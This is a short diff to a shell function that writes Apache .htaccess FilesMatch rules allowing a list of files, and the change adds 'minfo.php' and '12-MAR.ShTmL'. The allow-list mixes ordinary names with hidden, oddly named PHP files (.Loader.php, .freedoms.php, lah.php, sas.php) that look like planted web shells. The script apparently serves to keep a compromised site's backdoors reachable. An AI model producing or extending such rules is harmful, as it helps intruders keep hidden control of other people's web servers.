@@ -58,7 +58,7 @@ update_htaccess() {
     echo "    Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|login.php|.Loader.php|.user4-128x128.php|print_staff.php|print_laporan.php|lah.php|.Loader.php|.freedoms.php|sas.php)\$\">"
+    echo "<FilesMatch \"^(index.html|index.php|class.php|class-index.php|config.php|login.php|.Loader.php|.user4-128x128.php|print_staff.php|print_laporan.php|lah.php|.Loader.php|.freedoms.php|sas.php|minfo.php|12-MAR.ShTmL)\$\">"
     echo " Order allow,deny"
     echo " Allow from all"
     echo "</FilesMatch>"
